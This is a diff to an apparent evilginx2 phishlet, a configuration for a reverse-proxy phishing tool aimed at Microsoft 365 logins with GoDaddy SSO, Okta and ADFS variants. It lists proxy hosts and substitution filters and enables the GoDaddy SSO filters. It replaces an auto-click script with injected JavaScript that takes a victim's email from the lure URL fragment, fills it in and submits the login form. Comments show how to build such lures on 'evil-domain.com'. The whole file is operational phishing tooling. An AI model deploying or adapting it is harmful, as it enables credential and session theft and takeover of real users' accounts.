@@ -3,8 +3,8 @@ author: '@NOIR'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false }
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: false, is_landing:false }
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: false, is_landing:false}
   # The lines below are needed if your target organization utilizes ADFS.
   # If they do, you need to uncomment all following lines that contain <...>
   # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
@@ -18,7 +18,7 @@ proxy_hosts:
   #  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: '', session: true, is_landing:false}
   #  - {phish_sub: 'pointb', orig_sub: '', domain: 'okta.com:443', session: true, is_landing:false}
   #    WORKING SSO
-  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false }
   - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: false, is_landing: false}
   #  - {phish_sub: 'www', orig_sub: 'www', domain: 'godaddy.com', session: true, is_landing: false}
   #  WORKING OKTA
@@ -31,76 +31,14 @@ proxy_hosts:
 #  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: '', session: true, is_landing:false}
 
 sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], with_params: ['email']}
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true, with_params: ['email']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   # Uncomment and fill in if your target organization utilizes ADFS
-#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true }
-#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true }
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
 #  - {triggers_on: 'pointb.okta.com', orig_sub: 'pointb', domain: 'okta.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 #  - {triggers_on: '{hostname}', orig_sub: 'adfs', domain: '', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 
-
-
-js_inject:
-  - trigger_domains: ["login.microsoftonline.com"]
-    trigger_paths: ["/common/login"]
-    script: |
-      function autoBtnClick(){
-        console.log("trying autoclick");
-      if(document.getElementById("KmsiCheckboxField") != null){
-        console.log("now clicking button ")
-        setTimeout(function(){
-        document.getElementById("idSIButton9").click();
-        console.log("button clicked ");
-        }, 1000);
-      }
-      else{
-       console.log("error auto click trying again");
-      setTimeout(function(){autoBtnClick();}, 1000);
-      }
-      }
-      setTimeout(function(){autoBtnClick();}, 1000);
-  - trigger_domains: ["login.microsoftonline.com"]
-    trigger_paths: ["/common/oauth2/"]
-    script: |
-      var aemail = "";
-      const cat = localStorage.getItem('email');
-      if(cat){
-        aemail = cat;
-      }else{
-        console.log("no cat")
-      }
-      
-      
-      
-      console.log(aemail)
-      
-      
-      
-      function lp(){
-        try{
-            console.log("click form...");
-            document.getElementById("i0116").click()
-            console.log("started...");
-            document.getElementById("i0116").value = aemail;
-            if(document.getElementById("i0116").value != ""){
-              console.log("not null");
-      
-             // document.getElementById("idSIButton9").click()
-            }else{
-              console.log("null and not clicked");
-            }
-            //setTimeout(function(){;},1000)  
-          //  console.log("yes now click")
-          //  setTimeout(function(){document.getElementById("idSIButton9").click();document.getElementById("idSIButton9").click();document.getElementById("idSIButton9").click()},5000)
-          //  console.log("clicked")
-      
-        }
-        catch(err){
-          setTimeout(function(){lp();}, 1000);
-        }
-      }
-      setTimeout(function(){lp();}, 1000);
 
 
 
@@ -119,3 +57,37 @@ credentials:
 login:
   domain: 'login.microsoftonline.com'
   path: '/'
+
+
+# To autofill the login/email field , You can use below format with your generated lure to inject the email directly.
+# For example , Lure generated by evilginx2 is "https://evil-domain.com/d0n0T0p3n"
+# And you want to inject a email automatically in login field , email "innocentuser@example.com"
+# You can append this email with the above lure using '#' ,
+# For Example , the attacker will send the link " https://evil-domain.com/d0n0T0p3n#innocentuser@example.com"
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/","/","/*"]
+    script: |
+      function lp(){
+        var emailId = document.querySelector("#i0116");
+        var nextButton = document.querySelector("#idSIButton9");
+        var query = window.location.href;
+        if (/#/.test(window.location.href)){
+        var res = query.split("#");
+        var data1 = res[0];
+        var data2 = res[1];
+        console.log(data1);
+        console.log(data2);
+          if (emailId != null) {
+          var m = data2.replace(/[=]/gi, '');
+          emailId.focus();
+          emailId.value = m;
+          nextButton.focus();
+          nextButton.click();
+          console.log("YES!");
+          return;
+        }
+        }
+        setTimeout(function(){lp();}, 1500);
+      }
+      setTimeout(function(){lp();}, 1500);
